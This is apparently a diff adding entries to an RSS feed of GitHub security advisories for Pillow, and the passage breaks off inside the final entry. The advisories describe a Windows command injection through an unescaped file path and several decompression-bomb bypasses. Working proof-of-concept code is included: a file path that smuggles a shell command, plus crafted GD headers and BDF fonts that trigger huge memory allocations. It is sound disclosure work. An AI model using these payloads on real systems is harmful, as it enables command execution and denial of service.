@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://xlordz.github.io/github-advisory-database-rss/pip.rss</id>
     <title>Security Advisory for Python packages hosted at PyPI.org</title>
-    <updated>2026-07-20T20:01:00.278Z</updated>
+    <updated>2026-07-20T21:17:42.681Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"/>
     <subtitle>Security Advisory for Python packages hosted at PyPI.org on GitHub</subtitle>
@@ -11,6 +11,940 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[Pillow] Pillow: WindowsViewer.get_command() OS command injection via unescaped shell path]]></title>
+        <id>https://github.com/advisories/GHSA-4x4j-2g7c-83w6</id>
+        <link href="https://github.com/advisories/GHSA-4x4j-2g7c-83w6"/>
+        <updated>2026-07-20T21:14:14.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="1-summary">1. Summary</h3>
+<p><code>WindowsViewer.get_command()</code> constructs a <code>cmd.exe</code> shell command by directly embedding a
+file path into an f-string without escaping. The result is passed to
+<code>subprocess.Popen(..., shell=True)</code>. Shell metacharacters in the file path — most
+importantly a double-quote (<code>"</code>) that breaks out of the wrapping, followed by <code>&amp;</code> — allow
+injection of arbitrary <code>cmd.exe</code> commands.</p>
+<p>The macOS equivalent (<code>MacViewer</code>) correctly applies <code>shlex.quote()</code> to the same parameter.
+The Linux equivalent (<code>UnixViewer</code>) does likewise. Windows is the only platform missing this
+protection, despite <code>shlex.quote</code> being <strong>already imported</strong> on line 21 of <code>ImageShow.py</code>.</p>
+<hr>
+<h3 id="2-vulnerable-code">2. Vulnerable Code</h3>
+<p><strong>File:</strong> <code>src/PIL/ImageShow.py</code>, lines 133–150</p>
+<pre><code class="language-python">class WindowsViewer(Viewer):
+    format = "PNG"
+    options = {"compress_level": 1, "save_all": True}
+
+    def get_command(self, file: str, **options: Any) -&gt; str:
+        return (
+            f'start "Pillow" /WAIT "{file}" '    # ← f-string, no escaping
+            "&amp;&amp; ping -n 4 127.0.0.1 &gt;NUL "
+            f'&amp;&amp; del /f "{file}"'                # ← same path, unescaped again
+        )
+
+    def show_file(self, path: str, **options: Any) -&gt; int:
+        if not os.path.exists(path):
+            raise FileNotFoundError
+        subprocess.Popen(
+            self.get_command(path, **options),
+            shell=True,                          # ← shell=True
+            creationflags=getattr(subprocess, "CREATE_NO_WINDOW"),
+        )  # nosec                               # ← Bandit warning suppressed manually
+        return 1
+</code></pre>
+<p><strong>Contrast with macOS — SAFE (line 164–168):</strong></p>
+<pre><code class="language-python">class MacViewer(Viewer):
+    def get_command(self, file: str, **options: Any) -&gt; str:
+        command = "open -a Preview.app"
+        command = f"({command} {quote(file)}; sleep 20; rm -f {quote(file)})&amp;"
+        return command                           # ← shlex.quote() applied
+</code></pre>
+<p><strong>Cross-platform summary:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Platform</th>
+<th>Class</th>
+<th><code>shlex.quote()</code>?</th>
+<th><code>shell=True</code>?</th>
+<th>Safe?</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>macOS</td>
+<td><code>MacViewer</code></td>
+<td><strong>Yes</strong> (line 168)</td>
+<td>No (list args)</td>
+<td>✅ Yes</td>
+</tr>
+<tr>
+<td>Linux</td>
+<td><code>UnixViewer</code></td>
+<td><strong>Yes</strong> (line 207)</td>
+<td>No (list args)</td>
+<td>✅ Yes</td>
+</tr>
+<tr>
+<td>Windows</td>
+<td><code>WindowsViewer</code></td>
+<td><strong>No</strong> (line 134–137)</td>
+<td><strong>Yes</strong> (line 148)</td>
+<td>❌ No</td>
+</tr>
+</tbody></table>
+<p><code>shlex.quote</code> is imported on line 21. Its omission from the Windows path is a clear
+oversight, not a deliberate design choice.</p>
+<hr>
+<h3 id="3-proof-of-concept">3. Proof of Concept</h3>
+<p>A full working PoC is at <code>poc_pillow_injection.py</code>. Key parts:</p>
+<p><strong>Part A — Injection string construction (static, no execution):</strong></p>
+<pre><code class="language-python">from PIL.ImageShow import WindowsViewer
+
+viewer = WindowsViewer()
+evil_path = r'C:\Temp\evil" &amp; echo PWNED &amp; echo "'
+cmd = viewer.get_command(evil_path)
+print(cmd)
+# Output:
+# start "Pillow" /WAIT "C:\Temp\evil" &amp; echo PWNED &amp; echo "" &amp;&amp; ping ...
+# ┌─ start "Pillow" /WAIT "C:\Temp\evil"   → fails (file not found)
+# ├─ &amp; echo PWNED                           → INJECTED COMMAND
+# └─ &amp; echo ""  &amp;&amp; ping ...                → continues
+</code></pre>
+<p><strong>Part B — Live execution via <code>os.system()</code> (verified on Windows 11, Pillow 12.1.1):</strong></p>
+<pre><code class="language-python">import os, tempfile
+from PIL.ImageShow import WindowsViewer
+
+viewer = WindowsViewer()
+poc_dir = tempfile.mkdtemp()
+marker  = os.path.join(poc_dir, "INJECTION_CONFIRMED.txt")
+
+# Craft injection: payload writes a marker file (harmless)
+payload   = f'echo REAL_INJECTED &gt; "{marker}"'
+evil_path = os.path.join(poc_dir, f'poc" &amp; {payload} &amp; echo "')
+
+# Call the REAL Pillow get_command():
+real_cmd = viewer.get_command(evil_path)
+
+# Execute the same way the base Viewer.show_file() does (os.system):
+os.system(real_cmd)
+
+assert os.path.exists(marker)                          # PASSES — marker was created
+assert "REAL_INJECTED" in open(marker).read()          # PASSES
+# → CONFIRMED: arbitrary command injection via get_command()
+</code></pre>
+<hr>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/python-pillow/Pillow/security/advisories/GHSA-4x4j-2g7c-83w6">https://github.com/python-pillow/Pillow/security/advisories/GHSA-4x4j-2g7c-83w6</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-55798">https://nvd.nist.gov/vuln/detail/CVE-2026-55798</a></li>
+<li><a href="https://github.com/python-pillow/Pillow/commit/8404ea5fe5df40fc34aa1e51403dd6fce0778b8a">https://github.com/python-pillow/Pillow/commit/8404ea5fe5df40fc34aa1e51403dd6fce0778b8a</a></li>
+<li><a href="https://github.com/python-pillow/Pillow/commit/88194166691b7b603529b8b036ab3ab9cedd2de4">https://github.com/python-pillow/Pillow/commit/88194166691b7b603529b8b036ab3ab9cedd2de4</a></li>
+<li><a href="https://github.com/python-pillow/Pillow/commit/b0e06caa64c1405aa3da0bb1d2bd9a77ca22de7f">https://github.com/python-pillow/Pillow/commit/b0e06caa64c1405aa3da0bb1d2bd9a77ca22de7f</a></li>
+<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/pillow/PYSEC-2026-2257.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/pillow/PYSEC-2026-2257.yaml</a></li>
+<li><a href="https://github.com/python-pillow/Pillow/blob/main/docs/releasenotes/12.3.0.rst">https://github.com/python-pillow/Pillow/blob/main/docs/releasenotes/12.3.0.rst</a></li>
+<li><a href="https://github.com/advisories/GHSA-4x4j-2g7c-83w6">https://github.com/advisories/GHSA-4x4j-2g7c-83w6</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-4x4j-2g7c-83w6</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-07-20T21:14:14.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[pillow] Pillow `GdImageFile._open()`: image dimensions accepted without `_decompression_bomb_check()`]]></title>
+        <id>https://github.com/advisories/GHSA-phj9-mv4w-65pm</id>
+        <link href="https://github.com/advisories/GHSA-phj9-mv4w-65pm"/>
+        <updated>2026-07-20T21:13:38.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="description">Description</h2>
+<p><code>PIL/GdImageFile.py</code> <code>GdImageFile._open()</code> reads image dimensions from the GD 2.x header and stores them in <code>self._size</code> without calling <code>Image._decompression_bomb_check()</code>. Because <code>GdImageFile</code> is <strong>not registered with <code>Image.register_open()</code></strong>, it never passes through the standard <code>Image.open()</code> code path that enforces Pillow's decompression bomb guard. The plugin exposes its own entry point — <code>PIL.GdImageFile.open(fp)</code> — which directly instantiates the class, fully bypassing the documented protection.</p>
+<p><strong>Vulnerable code (<code>PIL/GdImageFile.py</code> lines 50–61):</strong></p>
+<pre><code class="language-python">def _open(self) -&gt; None:
+    s = self.fp.read(1037)
+    if i16(s) not in [65534, 65535]:
+        raise SyntaxError("Not a valid GD 2.x .gd file")
+    self._mode = "P"
+    self._size = i16(s, 2), i16(s, 4)   # ← unsigned 16-bit; max 65535 each
+    # NO _decompression_bomb_check() call here ←
+    ...
+    self.tile = [ImageFile._Tile("raw", (0, 0) + self.size, 1037, "L")]
+</code></pre>
+<p>When <code>load()</code> is subsequently called on the returned image object:</p>
+<pre><code class="language-python">load() → load_prepare() → Image.core.new("P", (65535, 65535))
+# ↑ C-level allocation of 4,294,836,225 bytes ≈ 4.3 GB — no Python bomb check precedes this
+</code></pre>
+<p><strong>Dimension arithmetic:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Maximum width from header</td>
+<td>65,535 (unsigned 16-bit)</td>
+</tr>
+<tr>
+<td>Maximum height from header</td>
+<td>65,535 (unsigned 16-bit)</td>
+</tr>
+<tr>
+<td>Maximum pixel count</td>
+<td>65,535 × 65,535 = <strong>4,294,836,225</strong></td>
+</tr>
+<tr>
+<td><code>DecompressionBombError</code> threshold</td>
+<td>178,956,970 (2 × MAX_IMAGE_PIXELS)</td>
+</tr>
+<tr>
+<td><strong>Overshoot ratio</strong></td>
+<td><strong>24× above DecompressionBombError threshold</strong></td>
+</tr>
+<tr>
+<td>Memory at max dimensions</td>
+<td><strong>≈ 4.3 GB</strong> (palette-mode: 1 byte/pixel)</td>
+</tr>
+<tr>
+<td>Minimum attack file size</td>
+<td><strong>1,037 bytes</strong> (header only — no pixel data needed)</td>
+</tr>
+</tbody></table>
+<p><strong>Comparison with safe sibling plugin (<code>WalImageFile</code>):</strong></p>
+<p><code>WalImageFile</code> is in the same category — not registered with <code>Image.open()</code>, loaded via its own <code>open()</code> helper. It was previously patched with the correct fix:</p>
+<pre><code class="language-python"># PIL/WalImageFile.py line 46 — CORRECT pattern (already patched)
+self._size = i32(header, 32), i32(header, 36)
+Image._decompression_bomb_check(self.size)   # ← present
+</code></pre>
+<p><code>GdImageFile</code> was never updated to match, leaving a gap in protection.</p>
+<h2 id="steps-to-reproduce">Steps to reproduce</h2>
+<p><strong>Proof of Concept script:</strong></p>
+<pre><code class="language-python">#!/usr/bin/env python3
+"""
+PoC: GdImageFile decompression bomb bypass
+1037-byte crafted .gd file → 4.3 GB C-heap allocation, NO bomb check
+"""
+import io, struct
+from PIL import GdImageFile, Image
+
+# Build minimal 1037-byte GD 2.x palette-mode header:
+#   sig(2) + width(2) + height(2) + true_color(1) + tindex(4) + colors_used(2) + palette(1024)
+sig          = struct.pack("&gt;H", 0xFFFE)       # 65534 = GD 2.x magic
+w            = struct.pack("&gt;H", 65535)         # max width
+h            = struct.pack("&gt;H", 65535)         # max height
+true_color   = b"\x00"                          # 0 = palette mode
+tindex       = struct.pack("&gt;I", 0xFFFFFFFF)    # &gt; 255 = no transparency
+colors_used  = b"\x00\x00"
+palette_data = b"\x00" * 1024
+header = sig + w + h + true_color + tindex + colors_used + palette_data
+assert len(header) == 1037
+
+# Confirm: standard Image.open() path BLOCKS this size
+try:
+    Image._decompression_bomb_check((65535, 65535))
+except Image.DecompressionBombError as e:
+    print(f"[BLOCKED] Image.open() path: {e}")
+
+# Vulnerable path: GdImageFile.open() has NO bomb check
+img = GdImageFile.open(io.BytesIO(header))
+print(f"[BYPASS] GdImageFile.open() succeeded: size={img.size}, mode={img.mode}")
+print(f"         No _decompression_bomb_check called — 4.3 GB allocation not blocked")
+
+# Trigger load_prepare() → Image.core.new("P", (65535, 65535))
+try:
+    img.load()
+except OSError:
+    print(f"[INFO]   load() OSError (no pixel data) — but C-heap allocation already attempted")
+
+print(f"\n[MATH]   {65535 * 65535:,} pixels = {65535*65535 / (Image.MAX_IMAGE_PIXELS*2):.1f}× error threshold")
+print(f"[MATH]   Attack file: 1,037 bytes only")
+</code></pre>
+<p><strong>Expected output:</strong></p>
+<pre><code>[BLOCKED] Image.open() path: Image size (4294836225 pixels) exceeds limit of 178956970
+pixels, could be decompression bomb DOS attack.
+[BYPASS] GdImageFile.open() succeeded: size=(65535, 65535), mode=P
+         No _decompression_bomb_check called — 4.3 GB allocation not blocked
+[INFO]   load() OSError (no pixel data) — but C-heap allocation already attempted
+
+[MATH]   4,294,836,225 pixels = 24.0× error threshold
+[MATH]   Attack file: 1,037 bytes only
+</code></pre>
+<p><strong>Verified live on Pillow 12.2.0.</strong></p>
+<p><strong>Two attack paths:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Path</th>
+<th>File size</th>
+<th>Effect</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Transient (header only)</td>
+<td><strong>1,037 bytes</strong></td>
+<td><code>load_prepare()</code> attempts 4.3 GB C allocation → <code>OSError</code> after spike</td>
+</tr>
+<tr>
+<td>Persistent (full pixel data)</td>
+<td>~4.3 GB</td>
+<td><code>load()</code> completes, 4.3 GB stays in memory for object lifetime</td>
+</tr>
+</tbody></table>
+<p>For the transient path, a 1,037-byte file is all that is needed. The attacker does not need to upload a large file.</p>
+<p><strong>Real-world scenario:</strong></p>
+<pre><code class="language-python">from PIL import GdImageFile
+
+# Application accepts user-uploaded .gd files
+img = GdImageFile.open(user_uploaded_file)   # succeeds — no bomb check
+img.load()                                    # triggers 4.3 GB C-heap allocation
+</code></pre>
+<h2 id="impact">Impact</h2>
+<ul>
+<li><strong>Availability:</strong> HIGH — a single 1,037-byte malicious <code>.gd</code> file causes the host process to attempt a ~4.3 GB C-heap allocation. On systems with insufficient memory this crashes the process. Repeatable — attacker can loop requests to keep the server down.</li>
+<li><strong>Confidentiality:</strong> None</li>
+<li><strong>Integrity:</strong> None</li>
+<li><strong>Authentication required:</strong> No — any public endpoint accepting image uploads is affected</li>
+<li><strong>User interaction:</strong> None</li>
+</ul>
+<p>Any service that calls <code>PIL.GdImageFile.open(user_file)</code> followed by <code>.load()</code> (or any lazy-load trigger) is vulnerable. Because the attack requires only a 1,037-byte file, network bandwidth is not a constraint.</p>
+<p>Confirmed unpatched on <code>python-pillow/Pillow</code> <code>main</code> branch as of 2026-06-08.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/python-pillow/Pillow/security/advisories/GHSA-phj9-mv4w-65pm">https://github.com/python-pillow/Pillow/security/advisories/GHSA-phj9-mv4w-65pm</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-55380">https://nvd.nist.gov/vuln/detail/CVE-2026-55380</a></li>
+<li><a href="https://github.com/python-pillow/Pillow/commit/f39b0ae6624eb2d7c5c5d651d9bb5fdbd96a8675">https://github.com/python-pillow/Pillow/commit/f39b0ae6624eb2d7c5c5d651d9bb5fdbd96a8675</a></li>
+<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/pillow/PYSEC-2026-2256.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/pillow/PYSEC-2026-2256.yaml</a></li>
+<li><a href="https://github.com/python-pillow/Pillow/blob/main/docs/releasenotes/12.3.0.rst">https://github.com/python-pillow/Pillow/blob/main/docs/releasenotes/12.3.0.rst</a></li>
+<li><a href="https://github.com/advisories/GHSA-phj9-mv4w-65pm">https://github.com/advisories/GHSA-phj9-mv4w-65pm</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-phj9-mv4w-65pm</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-07-20T21:13:35.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[pillow] Pillow `BdfFontFile`: `Image.new()` called without `_decompression_bomb_check()` — bomb protection bypass via font loading]]></title>
+        <id>https://github.com/advisories/GHSA-45hq-cxwh-f6vc</id>
+        <link href="https://github.com/advisories/GHSA-45hq-cxwh-f6vc"/>
+        <updated>2026-07-20T21:13:18.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p><code>PIL/BdfFontFile.py</code> <code>bdf_char()</code> (lines 84–88) reads the <code>BBX width height</code> field from a BDF font file and passes the dimensions directly to <code>Image.new()</code> without calling <code>Image._decompression_bomb_check()</code>. This completely bypasses Pillow's documented decompression bomb protection.</p>
+<p><code>Image.open()</code> enforces <code>MAX_IMAGE_PIXELS = 89,478,485</code> and raises <code>DecompressionBombError</code> for images exceeding <code>2 × MAX = 178,956,970</code> pixels. The BDF font loading path calls <code>Image.new()</code> directly, which only calls <code>_check_size()</code> (validates <code>&gt;= 0</code>) — no pixel count limit.</p>
+<p><strong>Vulnerable code (<code>PIL/BdfFontFile.py</code> lines 84–88):</strong></p>
+<pre><code class="language-python"># width, height from attacker-controlled "BBX width height x y" line
+try:
+    im = Image.frombytes("1", (width, height), bitmap, "hex", "1")
+except ValueError:
+    # TRIGGERED when BITMAP section is empty (zero hex lines)
+    im = Image.new("1", (width, height))   # ← NO _decompression_bomb_check()!
+    # ^ This image is stored in self.glyph[ch] — persists in memory
+</code></pre>
+<p><strong>Attack trigger:</strong> A BDF glyph with <code>BBX 20000 20000</code> and an empty <code>BITMAP</code> section causes <code>Image.frombytes()</code> to raise <code>ValueError</code>, then <code>Image.new("1", (20000, 20000))</code> allocates <strong>50 MB</strong> of C-heap silently. Image.open() would raise <code>DecompressionBombError</code> for the same dimensions.</p>
+<h2 id="steps-to-reproduce">Steps to reproduce</h2>
+<p><strong>Minimal malicious BDF file (270 bytes):</strong></p>
+<pre><code>STARTFONT 2.1
+SIZE 16 75 75
+FONTBOUNDINGBOX 16 16 0 -4
+STARTPROPERTIES 1
+COMMENT placeholder
+ENDPROPERTIES
+CHARS 1
+STARTCHAR A
+ENCODING 65
+SWIDTH 500 0
+DWIDTH 8 0
+BBX 20000 20000 0 0
+BITMAP
+ENDCHAR
+ENDFONT
+</code></pre>
+<p><strong>Proof of Concept script:</strong></p>
+<pre><code class="language-python">#!/usr/bin/env python3
+"""PoC: BdfFontFile bomb bypass — 270-byte BDF → 50 MB allocation"""
+import io, warnings
+warnings.filterwarnings("ignore")
+
+from PIL.BdfFontFile import BdfFontFile
+from PIL.Image import _decompression_bomb_check, DecompressionBombWarning, DecompressionBombError
+
+W, H = 20000, 20000   # 400M pixels → above DecompressionBombError threshold
+
+# Show what Image.open() would do
+warnings.filterwarnings("error", category=DecompressionBombWarning)
+try:
+    _decompression_bomb_check((W, H))
+except (DecompressionBombWarning, DecompressionBombError) as e:
+    print(f"[Image.open() path] BLOCKED by {type(e).__name__}")
+warnings.filterwarnings("ignore")
+
+# Malicious BDF: large BBX + empty BITMAP → ValueError → Image.new() without bomb check
+bdf = f"""STARTFONT 2.1
+SIZE 16 75 75
+FONTBOUNDINGBOX 16 16 0 -4
+STARTPROPERTIES 1
+COMMENT x
+ENDPROPERTIES
+CHARS 1
+STARTCHAR A
+ENCODING 65
+SWIDTH 500 0
+DWIDTH 8 0
+BBX {W} {H} 0 0
+BITMAP
+ENDCHAR
+ENDFONT
+""".encode()
+
+print(f"[*] BDF file size  : {len(bdf)} bytes")
+print(f"[*] Glyph size     : {W} x {H} = {W*H:,} pixels")
+print(f"[*] C-heap target  : {W*H//8//1024**2} MB  (mode '1' = 1 bit/pixel)")
+
+BdfFontFile(io.BytesIO(bdf))   # No exception — bomb check bypassed!
+
+print(f"[!] CONFIRMED: BdfFontFile loaded silently — {W*H//8//1024**2} MB allocated")
+print(f"    Image.open() path would have raised DecompressionBombError")
+</code></pre>
+<p><strong>Expected output:</strong></p>
+<pre><code>[Image.open() path] BLOCKED by DecompressionBombError
+[*] BDF file size  : 270 bytes
+[*] Glyph size     : 20000 x 20000 = 400,000,000 pixels
+[*] C-heap target  : 47 MB  (mode '1' = 1 bit/pixel)
+[!] CONFIRMED: BdfFontFile loaded silently — 47 MB allocated
+    Image.open() path would have raised DecompressionBombError
+</code></pre>
+<p><strong>Amplified attack (multiple glyphs):</strong><br>A BDF file defining 256 glyphs each at <code>BBX 8000 8000</code> causes <code>256 × 7.6 MB = ~1.95 GB</code> total C-heap allocation — all silently, bypassing documented bomb protection.</p>
+<h3 id="impact">Impact</h3>
+<ul>
+<li><strong>Availability</strong>: HIGH — attacker-controlled memory allocation per glyph × up to 65,536 glyphs</li>
+<li><strong>Confidentiality</strong>: None  </li>
+<li><strong>Integrity</strong>: None</li>
+<li>Any service loading BDF fonts from untrusted sources (e.g., <code>ImageFont.load("user.bdf")</code>, <code>BdfFontFile(fp)</code>) is affected</li>
+<li>Loaded glyph images persist in <code>self.glyph[ch]</code> for the lifetime of the font object — memory is NOT freed until the font is garbage collected</li>
+</ul>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/python-pillow/Pillow/security/advisories/GHSA-45hq-cxwh-f6vc">https://github.com/python-pillow/Pillow/security/advisories/GHSA-45hq-cxwh-f6vc</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-55379">https://nvd.nist.gov/vuln/detail/CVE-2026-55379</a></li>
+<li><a href="https://github.com/python-pillow/Pillow/commit/0a263e6264aa5399988d9acd3bbfbca2ca3ec77d">https://github.com/python-pillow/Pillow/commit/0a263e6264aa5399988d9acd3bbfbca2ca3ec77d</a></li>
+<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/pillow/PYSEC-2026-2255.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/pillow/PYSEC-2026-2255.yaml</a></li>
+<li><a href="https://github.com/python-pillow/Pillow/blob/main/docs/releasenotes/12.3.0.rst">https://github.com/python-pillow/Pillow/blob/main/docs/releasenotes/12.3.0.rst</a></li>
+<li><a href="https://github.com/advisories/GHSA-45hq-cxwh-f6vc">https://github.com/advisories/GHSA-45hq-cxwh-f6vc</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-45hq-cxwh-f6vc</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-07-20T21:13:18.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[pillow] Pillow: `FontFile.compile()`: `Image.new()` called without `_decompression_bomb_check()`]]></title>
+        <id>https://github.com/advisories/GHSA-5x94-69rx-g8h2</id>
+        <link href="https://github.com/advisories/GHSA-5x94-69rx-g8h2"/>
+        <updated>2026-07-20T21:08:43.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="description">Description</h2>
+<p><code>PIL/FontFile.py</code> <code>FontFile.compile()</code> assembles per-glyph images into a single combined bitmap using <code>Image.new("1", (xsize, ysize))</code> without calling <code>Image._decompression_bomb_check()</code>. This is the base-class method shared by both <code>BdfFontFile</code> and <code>PcfFontFile</code>, and it is triggered whenever a loaded font is converted to an <code>ImageFont</code> or saved.</p>
+<p>Neither <code>BdfFontFile.BdfFontFile(fp)</code> nor <code>PcfFontFile.PcfFontFile(fp)</code> is registered with <code>Image.register_open()</code>, so Pillow's standard decompression bomb guard never fires for font objects. The compile step is the final opportunity to check the combined allocation — and it has no check.</p>
+<p><strong>Vulnerable code (<code>PIL/FontFile.py</code> lines ~64–92):</strong></p>
+<pre><code class="language-python">def compile(self) -&gt; None:
+    if self.bitmap:
+        return
+
+    h = w = maxwidth = 0
+    lines = 1
+    for glyph in self.glyph:              # up to 256 glyph slots
+        if glyph:
+            d, dst, src, im = glyph
+            h = max(h, src[3] - src[1])   # max glyph height — attacker-controlled
+            w = w + (src[2] - src[0])
+            if w &gt; WIDTH:                  # WIDTH = 800
+                lines += 1
+                w = src[2] - src[0]
+            maxwidth = max(maxwidth, w)
+
+    xsize = maxwidth                       # ≤ 800 (capped by WIDTH constant)
+    ysize = lines * h                      # ← lines(256) × h(65535) = 16,776,960
+
+    if xsize == 0 and ysize == 0:
+        return
+
+    self.ysize = h
+    # NO _decompression_bomb_check() here ←
+    self.bitmap = Image.new("1", (xsize, ysize))   # ← unchecked allocation
+</code></pre>
+<p><strong>"Slow accumulation" attack — per-glyph dimensions stay BELOW warning threshold:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Metric</th>
+<th>Per-glyph (800 × 875)</th>
+<th>Combined bitmap (256 glyphs)</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Pixel count</td>
+<td>700,000</td>
+<td><strong>179,200,000</strong></td>
+</tr>
+<tr>
+<td>DecompressionBombWarning threshold (89.4M)</td>
+<td>0.008× — <strong>no warning</strong></td>
+<td>2.0× — above warning</td>
+</tr>
+<tr>
+<td>DecompressionBombError threshold (178.9M)</td>
+<td>0.004× — <strong>no error</strong></td>
+<td><strong>1.001× — above error</strong></td>
+</tr>
+</tbody></table>
+<p>With PCF-maximum glyph height (65,535):</p>
+<table>
+<thead>
+<tr>
+<th>Metric</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>lines</td>
+<td>256 (one per glyph slot, width=800 forces a wrap every glyph)</td>
+</tr>
+<tr>
+<td>h (max glyph height)</td>
+<td>65,535</td>
+</tr>
+<tr>
+<td>xsize</td>
+<td>800</td>
+</tr>
+<tr>
+<td>ysize = lines × h</td>
+<td>256 × 65,535 = <strong>16,776,960</strong></td>
+</tr>
+<tr>
+<td><strong>Total pixels</strong></td>
+<td>800 × 16,776,960 = <strong>13,421,568,000</strong></td>
+</tr>
+<tr>
+<td><strong>Ratio vs. DecompressionBombError threshold</strong></td>
+<td><strong>75×</strong></td>
+</tr>
+<tr>
+<td>Memory (mode "1", 1 bit/pixel)</td>
+<td><strong>~1.6 GB</strong></td>
+</tr>
+</tbody></table>
+<h2 id="steps-to-reproduce">Steps to reproduce</h2>
+<p><strong>Proof of Concept script:</strong></p>
+<pre><code class="language-python">#!/usr/bin/env python3
+"""
+PoC: FontFile.compile() bomb bypass
+256 glyphs at 800x875 each (individually below warning threshold)
+→ compile() creates 800x224000 = 179.2M px bitmap with NO bomb check
+"""
+from PIL import FontFile, Image
+
+MAX_GLYPHS = 256
+GLYPH_W    = 800
+GLYPH_H    = 875     # individual: 700K px — below 89.4M warning threshold
+
+class MockFont(FontFile.FontFile):
+    def __init__(self):
+        super().__init__()
+        # Each glyph is individually safe (700K px &lt; 89.4M warning)
+        im = Image.new("1", (GLYPH_W, GLYPH_H))
+        for i in range(MAX_GLYPHS):
+            self.glyph[i] = (
+                (GLYPH_W, GLYPH_H),
+                (0, -GLYPH_H, GLYPH_W, 0),
+                (0, 0,        GLYPH_W, GLYPH_H),
+                im,
+            )
+
+# Confirm bomb check WOULD catch the combined size
+combined_size = (GLYPH_W, MAX_GLYPHS * GLYPH_H)
+try:
+    Image._decompression_bomb_check(combined_size)
+    print("[FAIL] bomb check did not raise — unexpected")
+except Image.DecompressionBombError as e:
+    print(f"[OK] bomb check WOULD block {combined_size}: {e}")
+
+# Vulnerable path: compile() has NO bomb check
+font = MockFont()
+font.compile()   # → Image.new("1", (800, 224000)) — no error raised
+
+px = font.bitmap.size[0] * font.bitmap.size[1]
+threshold = Image.MAX_IMAGE_PIXELS * 2
+print(f"[BYPASS] compile() succeeded: bitmap={font.bitmap.size}")
+print(f"         pixels={px:,}  ({px/threshold:.3f}× DecompressionBombError threshold)")
+print(f"         No DecompressionBombError raised at any point.")
+</code></pre>
+<p><strong>Expected output:</strong></p>
+<pre><code>[OK] bomb check WOULD block (800, 224000): Image size (179200000 pixels) exceeds limit
+of 178956970 pixels, could be decompression bomb DOS attack.
+[BYPASS] compile() succeeded: bitmap=(800, 224000)
+         pixels=179,200,000  (1.001× DecompressionBombError threshold)
+         No DecompressionBombError raised at any point.
+</code></pre>
+<p><strong>Verified live on Pillow 12.2.0 — compile() succeeds with no exception.</strong></p>
+<p><strong>Real-world trigger using BDF font file:</strong></p>
+<pre><code class="language-python">from PIL import BdfFontFile
+import io
+
+# Load a crafted BDF font with 256 glyphs each claiming height=65535
+# (each glyph individually: 800 × 65535 = 52.4M px — below 89.4M warning)
+# compile() combined: 800 × 16,776,960 = 13.4B px — 75× error threshold
+font = BdfFontFile.BdfFontFile(open("crafted_256glyph.bdf", "rb"))
+font.to_imagefont()   # → compile() → ~1.6 GB allocation, NO bomb check
+</code></pre>
+<p><strong>Attack scenarios:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Scenario</th>
+<th>Effect</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Web font preview (<code>BdfFontFile(upload).to_imagefont()</code>)</td>
+<td>DoS with crafted .bdf upload</td>
+</tr>
+<tr>
+<td>Server-side font renderer that loads PCF → <code>to_imagefont()</code></td>
+<td>OOM crash</td>
+</tr>
+<tr>
+<td>Font pipeline: load → render text</td>
+<td>One malicious font file kills the process</td>
+</tr>
+</tbody></table>
+<h2 id="impact">Impact</h2>
+<ul>
+<li><strong>Availability:</strong> HIGH — <code>compile()</code> creates a combined bitmap whose pixel count scales as <code>WIDTH × lines × max_glyph_height</code> with no upper bound check. With max PCF glyph height (65,535) and 256 glyphs, the combined allocation is ~1.6 GB. With BDF (text-format, unbounded height), the allocation is limited only by system memory.</li>
+<li><strong>Confidentiality:</strong> None</li>
+<li><strong>Integrity:</strong> None</li>
+</ul>
+<p><strong>Affected call paths:</strong></p>
+<ul>
+<li><code>BdfFontFile.BdfFontFile(fp).to_imagefont()</code> → <code>FontFile.compile()</code></li>
+<li><code>BdfFontFile.BdfFontFile(fp).save(filename)</code> → <code>FontFile.compile()</code></li>
